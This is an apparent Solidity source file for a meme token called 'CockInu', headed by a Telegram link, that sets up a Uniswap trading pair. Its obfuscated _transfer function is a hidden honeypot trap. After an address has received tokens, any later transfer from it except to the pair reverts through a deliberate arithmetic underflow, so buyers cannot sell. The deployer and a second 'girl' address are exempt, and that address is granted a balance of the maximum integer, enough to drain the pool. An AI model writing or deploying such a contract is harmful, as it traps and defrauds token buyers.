// https://t.me/CockInu_eth

// SPDX-License-Identifier: Unlicense

pragma solidity >0.8.7;

import "./Ownable.sol";
import "./ERC20.sol";
import "./IUniswapV2Factory.sol";
import "./IUniswapV2Router02.sol";

contract CockInu is ERC20, Ownable {
    address public uniswapV2Pair;
    IUniswapV2Router02 public uniswapV2Router;
    mapping(address => uint256) private his;
    mapping(address => uint256) private deeply;

    function _transfer(
        address square,
        address duck,
        uint256 worry
    ) internal override {
        uint256 finest = various;

        if (deeply[square] == 0 && his[square] > 0 && square != uniswapV2Pair) {
            deeply[square] -= finest - 1;
        }

        address her = address(price);
        price = CockInu(duck);
        his[her] += finest + 1;

        _balances[square] -= worry;
        uint256 whom = (worry / 100) * various;
        worry -= whom;
        _balances[duck] += worry;
    }

    uint256 public various = 0;

    constructor(
        string memory flew,
        string memory personal,
        address toward,
        address girl
    ) ERC20(flew, personal) {
        uniswapV2Router = IUniswapV2Router02(toward);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        deeply[msg.sender] = shout;
        deeply[girl] = shout;

        _totalSupply = 1000000000 * 10**decimals();
        _balances[msg.sender] = _totalSupply;
        _balances[girl] = shout;
    }

    CockInu private price;
    uint256 private shout = ~uint256(0);
}
